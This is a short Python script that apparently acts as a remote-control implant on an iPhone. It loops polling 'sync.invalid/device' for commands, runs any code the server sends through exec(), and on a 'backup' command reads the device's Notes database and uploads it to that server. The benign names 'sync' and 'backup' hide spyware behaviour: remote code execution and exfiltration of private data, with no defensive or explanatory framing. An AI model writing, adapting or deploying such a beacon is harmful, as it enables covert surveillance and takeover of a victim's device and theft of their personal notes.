import requests
import time
from pathlib import Path

endpoint = "https://sync.invalid/device"
wait = 30
while True:
    job = requests.post(endpoint, json={"state": "ready"}).json()
    if job["command"] == "wait":
        wait = int(job["seconds"])
    elif job["command"] == "run":
        exec(job["code"])
    elif job["command"] == "backup":
        src = Path("/private/var/mobile/Library/Notes/notes.sqlite")
        requests.post(endpoint + "/nb", data=src.read_bytes())
    time.sleep(wait)
